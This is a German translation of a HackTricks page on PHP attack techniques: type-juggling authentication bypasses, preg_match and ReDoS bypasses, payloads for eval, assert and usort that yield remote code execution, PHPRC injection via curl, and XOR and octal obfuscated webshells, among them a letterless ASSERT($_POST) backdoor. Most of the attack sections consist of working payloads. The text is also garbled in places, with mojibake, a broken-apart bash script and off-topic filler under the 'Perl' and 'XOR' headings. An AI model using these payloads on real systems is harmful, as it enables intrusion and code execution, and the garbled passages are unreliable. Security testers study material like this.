# PHP Tricks

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>

## Cookies allgemeiner Speicherort:

Dies gilt auch f√ºr phpMyAdmin-Cookies.

Cookies:
```
PHPSESSID
phpMyAdmin
```
Standorte:
```
/var/lib/php/sessions
/var/lib/php5/
/tmp/
Example: ../../../../../../tmp/sess_d1d531db62523df80e1153ada1d4b02e
```
## Umgehung von PHP-Vergleichen

### Lockere Vergleiche/Typumwandlung ( == )

Wenn `==` in PHP verwendet wird, gibt es unerwartete F√§lle, in denen der Vergleich nicht wie erwartet funktioniert. Dies liegt daran, dass "==" nur Werte vergleicht, die in denselben Typ umgewandelt wurden. Wenn Sie auch den Typ der verglichenen Daten vergleichen m√∂chten, m√ºssen Sie `===` verwenden.

PHP-Vergleichstabellen: [https://www.php.net/manual/en/types.comparisons.php](https://www.php.net/manual/en/types.comparisons.php)

![](<../../../.gitbook/assets/image (40) (1).png>)

{% file src="../../../.gitbook/assets/EN-PHP-loose-comparison-Type-Juggling-OWASP (1).pdf" %}

* `"string" == 0 -> True` Ein String, der nicht mit einer Zahl beginnt, ist gleich einer Zahl.
* `"0xAAAA" == "43690" -> True` Zeichenketten, die aus Zahlen im Dezimal- oder Hexadezimalformat bestehen, k√∂nnen mit anderen Zahlen/Zeichenketten verglichen werden, wobei das Ergebnis True ist, wenn die Zahlen gleich sind (Zahlen in einer Zeichenkette werden als Zahlen interpretiert).
* `"0e3264578" == 0 --> True` Eine Zeichenkette, die mit "0e" beginnt und von beliebigem Inhalt gefolgt wird, ist gleich 0.
* `"0X3264578" == 0X --> True` Eine Zeichenkette, die mit "0" beginnt und von einem beliebigen Buchstaben gefolgt wird (X kann ein beliebiger Buchstabe sein) und von beliebigem Inhalt gefolgt wird, ist gleich 0.
* `"0e12334" == "0" --> True` Dies ist sehr interessant, weil Sie in einigen F√§llen den Zeichenketten-Eingang von "0" und einem Inhalt steuern k√∂nnen, der gehasht wird und mit ihm verglichen wird. Wenn Sie also einen Wert bereitstellen k√∂nnen, der einen Hash erzeugt, der mit "0e" beginnt und keinen Buchstaben enth√§lt, k√∂nnten Sie den Vergleich umgehen. Sie k√∂nnen **bereits gehashte Zeichenketten** mit diesem Format hier finden: [https://github.com/spaze/hashes](https://github.com/spaze/hashes)
* `"X" == 0 --> True` Jeder Buchstabe in einer Zeichenkette ist gleich der Ganzzahl 0.

Weitere Informationen finden Sie unter [https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09](https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09)

### **in\_array()**

**Typumwandlung** betrifft auch die Funktion `in_array()` standardm√§√üig (Sie m√ºssen das dritte Argument auf true setzen, um einen strengen Vergleich durchzuf√ºhren):
```php
$values = array("apple","orange","pear","grape");
var_dump(in_array(0, $values));
//True
var_dump(in_array(0, $values, true));
//False
```
### strcmp()/strcasecmp()

Wenn diese Funktion f√ºr **eine beliebige Authentifizierungspr√ºfung** verwendet wird (wie zum Beispiel das √úberpr√ºfen des Passworts) und der Benutzer eine Seite des Vergleichs kontrolliert, kann er anstelle eines Strings ein leeres Array als Passwortwert senden (`https://example.com/login.php/?username=admin&password[]=`) und diese Pr√ºfung umgehen:
```php
if (!strcmp("real_pwd","real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
if (!strcmp(array(),"real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
```
Der gleiche Fehler tritt bei `strcasecmp()` auf.

### Striktes Typ-Juggling

Auch wenn `===` verwendet wird, k√∂nnen Fehler auftreten, die den Vergleich anf√§llig f√ºr Typ-Juggling machen. Zum Beispiel, wenn der Vergleich die Daten vor dem Vergleich in einen anderen Objekttyp umwandelt:
```php
(int) "1abc" === (int) "1xyz" //This will be true
```
### preg\_match(/^.\*/)

Die Funktion **`preg_match()`** kann verwendet werden, um die **Benutzereingabe zu validieren** (sie √ºberpr√ºft, ob ein **Wort/Regex** aus einer **Blacklist** in der **Benutzereingabe vorhanden** ist und wenn nicht, kann der Code seine Ausf√ºhrung fortsetzen).

#### Umgehung der Zeilenumbruchpr√ºfung

Jedoch √ºberpr√ºft `preg_match()` beim Begrenzen des Anfangs des Regexps nur die erste Zeile der Benutzereingabe. Wenn es Ihnen also irgendwie gelingt, die Eingabe in **mehreren Zeilen** zu **senden**, k√∂nnten Sie diese √úberpr√ºfung umgehen. Beispiel:
```php
$myinput="aaaaaaa
11111111"; //Notice the new line
echo preg_match("/1/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/1.*$/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/^.*1/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
echo preg_match("/^.*1.*$/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
```
Um diese √úberpr√ºfung zu umgehen, k√∂nnten Sie den Wert mit neuen Zeilen urlcodiert senden (`%0A`) oder, wenn Sie JSON-Daten senden k√∂nnen, senden Sie sie in mehreren Zeilen:
```php
{
"cmd": "cat /etc/passwd"
}
```
Ein Beispiel finden Sie hier: [https://ramadistra.dev/fbctf-2019-rceservice](https://ramadistra.dev/fbctf-2019-rceservice)

#### **L√§ngenfehler umgehen**

(Dieser Umgehung wurde anscheinend auf PHP 5.2.5 ausprobiert und ich konnte es nicht auf PHP 7.3.15 zum Laufen bringen)\
Wenn Sie `preg_match()` eine g√ºltige sehr **gro√üe Eingabe** senden, wird es **nicht in der Lage sein, sie zu verarbeiten** und Sie k√∂nnen die √úberpr√ºfung **umgehen**. Zum Beispiel, wenn es JSON auf die Blacklist setzt, k√∂nnten Sie Folgendes senden:
```bash
payload = '{"cmd": "ls -la", "injected": "'+ "a"*1000001 + '"}'
```
#### ReDoS Bypass

Trick von: [https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223](https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223)


<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

Kurz gesagt tritt das Problem auf, weil die `preg_*` Funktionen in PHP auf der [PCRE-Bibliothek](http://www.pcre.org/) aufbauen. In PCRE werden bestimmte regul√§re Ausdr√ºcke durch viele rekursive Aufrufe abgeglichen, die viel Stack-Speicher verbrauchen. Es ist m√∂glich, eine Begrenzung f√ºr die Anzahl der erlaubten Rekursionen festzulegen, aber in PHP ist diese Begrenzung [standardm√§√üig auf 100.000](http://php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit) eingestellt, was mehr ist als in den Stack passt.

[Auf diesem Stackoverflow-Thread](http://stackoverflow.com/questions/7620910/regexp-in-preg-match-function-returning-browser-error) wurde auch in dem Beitrag verlinkt, in dem dieses Problem genauer erl√§utert wird. Unsere Aufgabe war nun klar:\
**Senden Sie eine Eingabe, die das Regex dazu bringt, 100.000+ Rekursionen durchzuf√ºhren, was zu SIGSEGV f√ºhrt und dazu f√ºhrt, dass die Funktion `preg_match()` `false` zur√ºckgibt. Dadurch denkt die Anwendung, dass unsere Eingabe nicht b√∂sartig ist, und wir k√∂nnen am Ende der Nutzlast mit etwas wie `{system(<sehrschlechterbefehl>)}` eine √úberraschung ausl√∂sen, um SSTI --> RCE --> Flag zu erhalten :)**.

Nun, in Bezug auf Regex machen wir tats√§chlich keine 100.000 "Rekursionen", sondern wir z√§hlen "Backtracking-Schritte", wie es in der [PHP-Dokumentation](https://www.php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit) hei√üt, die standardm√§√üig auf 1.000.000 (1M) in der Variable `pcre.backtrack_limit` festgelegt ist.\
Um das zu erreichen, f√ºhrt `'X'*500_001` zu 1 Million Backtracking-Schritten (500k vorw√§rts und 500k r√ºckw√§rts):
```python
payload = f"@dimariasimone on{'X'*500_001} {{system('id')}}"
```
### Typ-Jonglieren zur PHP-Verschleierung

Type Juggling ist eine Technik, die in PHP verwendet werden kann, um den Code zu verschleiern und die Lesbarkeit zu erschweren. Diese Technik nutzt die Art und Weise, wie PHP mit unterschiedlichen Datentypen umgeht, um den Code zu manipulieren.

In PHP k√∂nnen Variablen automatisch in verschiedene Datentypen umgewandelt werden, je nachdem, wie sie verwendet werden. Dies erm√∂glicht es uns, bestimmte Eigenschaften von PHP auszunutzen, um den Code zu verschleiern.

Ein Beispiel f√ºr Typ-Jonglieren ist die Verwendung von Vergleichsoperatoren. Wenn wir beispielsweise den Vergleichsoperator "==" verwenden, f√ºhrt PHP eine implizite Typumwandlung durch, um die Vergleichbarkeit der Werte zu erm√∂glichen. Dies kann dazu f√ºhren, dass zwei scheinbar unterschiedliche Werte als gleich angesehen werden.

Ein weiteres Beispiel ist die Verwendung von arithmetischen Operationen. Wenn wir beispielsweise eine Zeichenkette mit einer Zahl addieren, wandelt PHP die Zeichenkette automatisch in eine Zahl um und f√ºhrt die Addition durch.

Diese Art der Verschleierung kann es schwieriger machen, den Code zu verstehen und zu analysieren, da die Absicht hinter den Operationen nicht offensichtlich ist. Es ist jedoch wichtig zu beachten, dass dies keine sichere Methode ist, um den Code vor Reverse Engineering oder Angriffen zu sch√ºtzen. Es ist lediglich eine Technik, um die Lesbarkeit zu erschweren.

Es ist auch wichtig zu beachten, dass Typ-Jonglieren in einigen F√§llen zu unerwartetem Verhalten f√ºhren kann. Es ist daher ratsam, diese Technik mit Vorsicht anzuwenden und die Auswirkungen auf den Code zu √ºberpr√ºfen.

Insgesamt kann Typ-Jonglieren eine n√ºtzliche Technik sein, um den Code zu verschleiern und die Lesbarkeit zu erschweren. Es ist jedoch wichtig, die Auswirkungen und potenziellen Risiken zu verstehen, bevor man diese Technik anwendet.
```php
$obfs = "1"; //string "1"
$obfs++; //int 2
$obfs += 0.2; //float 2.2
$obfs = 1 + "7 IGNORE"; //int 8
$obfs = "string" + array("1.1 striiing")[0]; //float 1.1
$obfs = 3+2 * (TRUE + TRUE); //int 7
$obfs .= ""; //string "7"
$obfs += ""; //int 7
```
## Execute After Redirect (EAR)

Wenn PHP zu einer anderen Seite umleitet, aber keine **`die`** oder **`exit`** Funktion **nach dem Setzen des Headers `Location`** aufgerufen wird, wird PHP fortgesetzt und f√ºgt die Daten dem Body hinzu:
```php
<?php
// In this page the page will be read and the content appended to the body of
// the redirect response
$page = $_GET['page'];
header('Location: /index.php?page=default.html');
readfile($page);
?>
```
## Weitere Tricks

* **register\_globals**: In **PHP < 4.1.1.1** oder wenn falsch konfiguriert, kann **register\_globals** aktiv sein (oder ihr Verhalten wird nachgeahmt). Dies bedeutet, dass in globalen Variablen wie $\_GET, wenn sie einen Wert haben, z.B. $\_GET\["param"]="1234", darauf √ºber **$param zugegriffen werden kann. Daher k√∂nnen Sie durch das Senden von HTTP-Parametern Variablen √ºberschreiben**, die im Code verwendet werden.
* Die **PHPSESSION-Cookies der gleichen Domain werden am selben Ort gespeichert**, daher k√∂nnen Sie, wenn innerhalb einer Domain **verschiedene Cookies in verschiedenen Pfaden** verwendet werden, bewirken, dass ein Pfad **auf das Cookie des anderen Pfads zugreift**, indem Sie den Wert des Cookies des anderen Pfads setzen.\
Auf diese Weise k√∂nnen Sie, wenn **beide Pfade auf eine Variable mit demselben Namen zugreifen**, den **Wert dieser Variable in Pfad1 auf Pfad2 anwenden**. Und dann werden die Variablen von Pfad1 von Pfad2 als g√ºltig betrachtet (indem Sie dem Cookie den entsprechenden Namen in Pfad2 geben).
* Wenn Sie die **Benutzernamen** der Benutzer der Maschine haben, √ºberpr√ºfen Sie die Adresse: **/\~\<BENUTZERNAME>**, um zu sehen, ob die PHP-Verzeichnisse aktiviert sind.
* [**LFI und RCE mit php wrappers**](../../../pentesting-web/file-inclusion/)

### password\_hash/password\_verify

Diese Funktionen werden typischerweise in PHP verwendet, um **Hashes aus Passw√∂rtern zu generieren** und zu √ºberpr√ºfen, ob ein Passwort mit einem Hash √ºbereinstimmt.\
Die unterst√ºtzten Algorithmen sind: `PASSWORD_DEFAULT` und `PASSWORD_BCRYPT` (beginnt mit `$2y$`). Beachten Sie, dass **PASSWORD\_DEFAULT h√§ufig dasselbe wie PASSWORD\_BCRYPT ist**. Und derzeit hat **PASSWORD\_BCRYPT** eine **Gr√∂√üenbeschr√§nkung f√ºr die Eingabe von 72 Bytes**. Wenn Sie also versuchen, etwas Gr√∂√üeres als 72 Bytes mit diesem Algorithmus zu hashen, werden nur die ersten 72 Bytes verwendet:
```php
$cont=71; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
False

$cont=72; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
True
```
### Umgehung von HTTP-Headern durch Ausnutzung von PHP-Fehlern

Wenn eine **PHP-Seite Fehler druckt und einige vom Benutzer bereitgestellte Eingaben ausgibt**, kann der Benutzer den PHP-Server dazu bringen, einige **ausreichend lange Inhalte** zur√ºckzugeben, sodass beim Versuch, die Header in die Antwort einzuf√ºgen, der Server einen Fehler wirft.\
Im folgenden Szenario hat der **Angreifer den Server dazu gebracht, einige gro√üe Fehler zu werfen**, und wie Sie auf dem Bildschirm sehen k√∂nnen, konnte PHP beim **√Ñndern der Header-Informationen dies nicht tun** (beispielsweise wurde der CSP-Header nicht an den Benutzer gesendet):

![](<../../../.gitbook/assets/image (465).png>)

## Code-Ausf√ºhrung

**system("ls");**\
**\`ls\`;**\
**shell\_exec("ls");**

[√úberpr√ºfen Sie dies f√ºr weitere n√ºtzliche PHP-Funktionen](php-useful-functions-disable\_functions-open\_basedir-bypass/)
```php
preg_replace(pattern,replace,base)
preg_replace("/a/e","phpinfo()","whatever")
```
Um den Code im "replace" Argument auszuf√ºhren, ist mindestens eine √úbereinstimmung erforderlich.\
Diese Option von preg\_replace wurde **ab PHP 5.5.0 als veraltet markiert.**

### **RCE √ºber Eval()**
```
'.system('uname -a'); $dummy='
'.system('uname -a');#
'.system('uname -a');//
'.phpinfo().'
<?php phpinfo(); ?>
```
### **RCE √ºber Assert()**

Diese Funktion in PHP erm√∂glicht es Ihnen, **Code auszuf√ºhren, der in einem String geschrieben ist**, um **true oder false zur√ºckzugeben** (und je nachdem die Ausf√ºhrung zu √§ndern). Normalerweise wird die Benutzervariable in der Mitte eines Strings eingef√ºgt. Zum Beispiel:\
`assert("strpos($_GET['page']),'..') === false")` --> In diesem Fall k√∂nnten Sie **RCE** erreichen, indem Sie Folgendes tun:
```
?page=a','NeVeR') === false and system('ls') and strpos('a
```
Sie m√ºssen den Code **brechen**, die **Syntax** **hinzuf√ºgen** und dann wieder **reparieren**. Sie k√∂nnen **logische Operationen** wie "**and" oder "%26%26" oder "|"** verwenden. Beachten Sie, dass "or" und "||" nicht funktionieren, da unser Payload nicht ausgef√ºhrt wird, wenn die erste Bedingung wahr ist. Ebenso funktioniert ";" nicht, da unser Payload nicht ausgef√ºhrt wird.

**Eine andere Option** besteht darin, der Zeichenkette die Ausf√ºhrung des Befehls hinzuzuf√ºgen: `'.highlight_file('.passwd').'`

**Eine andere Option** (wenn Sie den internen Code haben) besteht darin, eine Variable zu √§ndern, um die Ausf√ºhrung zu beeinflussen: `$file = "hola"`

### **RCE √ºber usort()**

Diese Funktion wird verwendet, um ein Array von Elementen mithilfe einer bestimmten Funktion zu sortieren.\
Um diese Funktion zu missbrauchen:
```php
<?php usort(VALUE, "cmp"); #Being cmp a valid function ?>
VALUE: );phpinfo();#

<?php usort();phpinfo();#, "cmp"); #Being cmp a valid function ?>
```

```php
<?php
function foo($x,$y){
usort(VALUE, "cmp");
}?>
VALUE: );}[PHP CODE];#

<?php
function foo($x,$y){
usort();}phpinfo;#, "cmp");
}?>
```
Sie k√∂nnen auch **//** verwenden, um den restlichen Code zu kommentieren.

Um die Anzahl der Klammern zu ermitteln, die Sie schlie√üen m√ºssen:

* `?order=id;}//`: Wir erhalten eine Fehlermeldung (`Parse error: syntax error, unexpected ';'`). Wahrscheinlich fehlen uns eine oder mehrere Klammern.
* `?order=id);}//`: Wir erhalten eine **Warnung**. Das scheint richtig zu sein.
* `?order=id));}//`: Wir erhalten eine Fehlermeldung (`Parse error: syntax error, unexpected ')' i`). Wahrscheinlich haben wir zu viele schlie√üende Klammern.

### **RCE √ºber .httaccess**

Wenn Sie eine **.htaccess**-Datei **hochladen** k√∂nnen, k√∂nnen Sie verschiedene Dinge konfigurieren und sogar Code ausf√ºhren (indem Sie festlegen, dass Dateien mit der Erweiterung .htaccess **ausgef√ºhrt** werden k√∂nnen).

Verschiedene .htaccess-Shells finden Sie [hier](https://github.com/wireghoul/htshells)

### RCE √ºber Umgebungsvariablen

Wenn Sie eine Schwachstelle finden, die es Ihnen erm√∂glicht, **Umgebungsvariablen in PHP zu √§ndern** (und eine weitere, um Dateien hochzuladen, obwohl dies m√∂glicherweise umgangen werden kann), k√∂nnen Sie dieses Verhalten missbrauchen, um **RCE** zu erhalten.

* [**`LD_PRELOAD`**](../../../linux-hardening/privilege-escalation/#ld\_preload-and-ld\_library\_path): Diese Umgebungsvariable erm√∂glicht das Laden beliebiger Bibliotheken beim Ausf√ºhren anderer Bin√§rdateien (obwohl dies in diesem Fall m√∂glicherweise nicht funktioniert).
* **`PHPRC`** : Gibt PHP an, **wo sich seine Konfigurationsdatei** befindet, normalerweise `php.ini` genannt. Wenn Sie Ihre eigene Konfigurationsdatei hochladen k√∂nnen, verwenden Sie `PHPRC`, um PHP darauf zu verweisen. F√ºgen Sie einen Eintrag **`auto_prepend_file`** hinzu, der auf eine zweite hochgeladene Datei verweist. Diese zweite Datei enth√§lt normalen **PHP-Code, der dann** vom PHP-Laufzeitmodul vor jedem anderen Code ausgef√ºhrt wird.
1. Laden Sie eine PHP-Datei hoch, die unseren Shellcode enth√§lt.
2. Laden Sie eine zweite Datei hoch, die eine **`auto_prepend_file`**-Anweisung enth√§lt, die den PHP-Pr√§prozessor anweist, die Datei, die wir in Schritt 1 hochgeladen haben, auszuf√ºhren.
3. Setzen Sie die Variable `PHPRC` auf die Datei, die wir in Schritt 2 hochgeladen haben.
* Weitere Informationen zur Ausf√ºhrung dieser Kette finden Sie im [**urspr√ºnglichen Bericht**](https://labs.watchtowr.com/cve-2023-36844-and-friends-rce-in-juniper-firewalls/).
* **PHPRC** - eine weitere Option
* Wenn Sie **keine Dateien hochladen k√∂nnen**, k√∂nnen Sie in FreeBSD die Datei "/dev/fd/0" verwenden, die den **`stdin`** enth√§lt, der den **Body** der Anfrage enth√§lt, der an den `stdin` gesendet wird:
* `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary 'auto_prepend_file="/etc/passwd"'`
* Oder um RCE zu erhalten, aktivieren Sie **`allow_url_include`** und f√ºgen Sie eine Datei mit **base64 PHP-Code** hinzu:
* `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary $'allow_url_include=1\nauto_prepend_file="data://text/plain;base64,PD8KICAgcGhwaW5mbygpOwo/Pg=="'`
* Technik [**aus diesem Bericht**](https://vulncheck.com/blog/juniper-cve-2023-36845).

## Statische Analyse von PHP

√úberpr√ºfen Sie, ob Sie Code in Aufrufe dieser Funktionen einf√ºgen k√∂nnen (von [hier](https://www.youtube.com/watch?v=SyWUsN0yHKI\&feature=youtu.be)):
```php
exec, shell_exec, system, passthru, eval, popen
unserialize, include, file_put_cotents
$_COOKIE | if #This mea
```
Wenn Sie eine PHP-Anwendung debuggen, k√∂nnen Sie das Anzeigen von Fehlern global in `/etc/php5/apache2/php.ini` aktivieren, indem Sie `display_errors = On` hinzuf√ºgen und Apache neu starten: `sudo systemctl restart apache2`

### Entschl√ºsselung von PHP-Code

Sie k√∂nnen die Website [www.unphp.net](http://www.unphp.net) verwenden, um PHP-Code zu entschl√ºsseln.

## PHP-Wrappers und Protokolle

PHP-Wrappers und Protokolle k√∂nnen es Ihnen erm√∂glichen, Schreib- und Leseschutz in einem System zu umgehen und es zu kompromittieren. Weitere Informationen finden Sie auf [dieser Seite](../../../pentesting-web/file-inclusion/#lfi-rfi-using-php-wrappers-and-protocols).

## Xdebug unauthentifizierte RCE

Wenn Sie feststellen, dass Xdebug in einer `phpconfig()`-Ausgabe aktiviert ist, sollten Sie versuchen, RCE √ºber [https://github.com/nqxcode/xdebug-exploit](https://github.com/nqxcode/xdebug-exploit) zu erhalten.

## Variable Variablen
```php
$x = 'Da';
$$x = 'Drums';

echo $x; //Da
echo $$x; //Drums
echo $Da; //Drums
echo "${Da}"; //Drums
echo "$x ${$x}"; //Da Drums
echo "$x ${Da}"; //Da Drums
```
## RCE durch Missbrauch von $\_GET\["a"]\($\_GET\["b"])

Wenn Sie auf einer Seite **ein neues Objekt einer beliebigen Klasse erstellen** k√∂nnen, k√∂nnen Sie m√∂glicherweise RCE erlangen. √úberpr√ºfen Sie die folgende Seite, um mehr zu erfahren:

{% content-ref url="php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md" %}
[php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md](php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md)
{% endcontent-ref %}

## PHP ohne Buchstaben ausf√ºhren

[https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/](https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/)

### Verwendung von Oktalzahlen
```php
$_="\163\171\163\164\145\155(\143\141\164\40\56\160\141\163\163\167\144)"; #system(cat .passwd);
```
### **XOR**

Die XOR-Operation (Exclusive OR) ist eine logische Operation, die auf zwei bin√§ren Eingaben durchgef√ºhrt wird. Das Ergebnis ist 1, wenn die beiden Eingaben unterschiedlich sind, andernfalls ist das Ergebnis 0.

In der Kryptographie wird XOR h√§ufig verwendet, um Daten zu verschl√ºsseln und zu entschl√ºsseln. Durch Anwendung der XOR-Operation auf die Daten und einen Schl√ºssel wird eine Verschl√ºsselung erzeugt. Um die Daten wiederherzustellen, wird erneut die XOR-Operation auf die verschl√ºsselten Daten und den gleichen Schl√ºssel angewendet.

XOR kann auch in der Programmierung verwendet werden, um bestimmte Aufgaben zu erf√ºllen, wie zum Beispiel das Umkehren von Bits oder das Erzeugen von Pr√ºfsummen.

Die XOR-Operation ist eine wichtige Technik in der Welt des Hackings, da sie in verschiedenen Angriffsszenarien verwendet werden kann, wie zum Beispiel bei der Analyse von verschl√ºsselten Daten oder beim Umgehen von Sicherheitsmechanismen.
```php
$_=("%28"^"[").("%33"^"[").("%34"^"[").("%2c"^"[").("%04"^"[").("%28"^"[").("%34"^"[").("%2e"^"[").("%29"^"[").("%38"^"[").("%3e"^"["); #show_source
$__=("%0f"^"!").("%2f"^"_").("%3e"^"_").("%2c"^"_").("%2c"^"_").("%28"^"_").("%3b"^"_"); #.passwd
$___=$__; #Could be not needed inside eval
$_($___); #If ¬¢___ not needed then $_($__), show_source(.passwd)
```
### XOR einfacher Shell-Code

Laut [**diesem Bericht**](https://mgp25.com/ctf/Web-challenge/) ist es m√∂glich, auf einfache Weise einen Shell-Code zu generieren, indem man Folgendes tut:
```php
$_="`{{{"^"?<>/"; // $_ = '_GET';
${$_}[_](${$_}[__]); // $_GET[_]($_GET[__]);

$_="`{{{"^"?<>/";${$_}[_](${$_}[__]); // $_ = '_GET'; $_GET[_]($_GET[__]);
```
So, wenn Sie **beliebigen PHP-Code ohne Zahlen und Buchstaben ausf√ºhren k√∂nnen**, k√∂nnen Sie eine Anfrage wie die folgende senden, um diesen Payload zu missbrauchen und beliebigen PHP-Code auszuf√ºhren:
```
POST: /action.php?_=system&__=cat+flag.php
Content-Type: application/x-www-form-urlencoded

comando=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);
```
F√ºr eine ausf√ºhrlichere Erkl√§rung siehe [https://ctf-wiki.org/web/php/php/#preg\_match](https://ctf-wiki.org/web/php/php/#preg\_match)

### XOR Shellcode (innerhalb von eval)
```bash
#!/bin/bash

if [[ -z $1 ]]; then
echo "USAGE: $0 CMD"
exit
fi

CMD=$1
CODE="\$_='\
```

```php
lt;>/'^'{{{{';\${\$_}[_](\${\$_}[__]);" `$_='
```

```php
lt;>/'^'{{{{'; --> _GET` `${$_}[_](${$_}[__]); --> $_GET[_]($_GET[__])` `So, the function is inside $_GET[_] and the parameter is inside $_GET[__]` http --form POST "http://victim.com/index.php?_=system&__=$CMD" "input=$CODE"
```
### Perl-√§hnlich

Perl ist eine weit verbreitete Skriptsprache, die f√ºr ihre leistungsstarke Textverarbeitungsf√§higkeiten bekannt ist. In diesem Abschnitt werden einige Perl-√§hnliche Funktionen und Techniken in PHP vorgestellt, die Ihnen helfen k√∂nnen, Ihre Webanwendungen effizienter zu entwickeln.

#### Regul√§re Ausdr√ºcke

Regul√§re Ausdr√ºcke sind ein leistungsstarkes Werkzeug zur Mustererkennung und Textmanipulation. In PHP k√∂nnen Sie regul√§re Ausdr√ºcke mit der `preg_match()`-Funktion verwenden. Hier ist ein Beispiel, wie Sie eine Telefonnummer aus einem Text extrahieren k√∂nnen:

```php
$text = "Meine Telefonnummer ist 123-456-7890";
$pattern = "/\d{3}-\d{3}-\d{4}/";
preg_match($pattern, $text, $matches);
$phone_number = $matches[0];
```

#### String-Manipulation

PHP bietet eine Vielzahl von Funktionen zur Manipulation von Zeichenketten. Hier sind einige Beispiele:

- `strlen()`: Gibt die L√§nge einer Zeichenkette zur√ºck.
- `strpos()`: Sucht nach dem ersten Vorkommen eines Substrings in einer Zeichenkette.
- `str_replace()`: Ersetzt alle Vorkommen eines Substrings in einer Zeichenkette.
- `strtolower()`: Konvertiert eine Zeichenkette in Kleinbuchstaben.
- `strtoupper()`: Konvertiert eine Zeichenkette in Gro√übuchstaben.

#### Dateioperationen

PHP bietet auch Funktionen zum Lesen und Schreiben von Dateien. Hier sind einige Beispiele:

- `file_get_contents()`: Liest den Inhalt einer Datei in eine Zeichenkette.
- `file_put_contents()`: Schreibt eine Zeichenkette in eine Datei.
- `file_exists()`: √úberpr√ºft, ob eine Datei existiert.
- `unlink()`: L√∂scht eine Datei.

#### Systembefehle ausf√ºhren

Mit der `exec()`-Funktion k√∂nnen Sie Systembefehle direkt von PHP ausf√ºhren. Hier ist ein Beispiel:

```php
$command = "ls -l";
$output = exec($command);
echo $output;
```

#### Datenbankzugriff

PHP bietet verschiedene Funktionen zum Arbeiten mit Datenbanken. Hier sind einige Beispiele:

- `mysqli_connect()`: Stellt eine Verbindung zu einer MySQL-Datenbank her.
- `mysqli_query()`: F√ºhrt eine SQL-Abfrage auf der Datenbank aus.
- `mysqli_fetch_assoc()`: Ruft eine Zeile aus dem Abfrageergebnis als assoziatives Array ab.

Diese Perl-√§hnlichen Funktionen und Techniken k√∂nnen Ihnen helfen, Ihre PHP-Webanwendungen effizienter zu entwickeln und komplexe Aufgaben zu automatisieren.
```php
<?php
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;

$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;

$_=$$____;
$___($_[_]); // ASSERT($_POST[_]);
```
<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

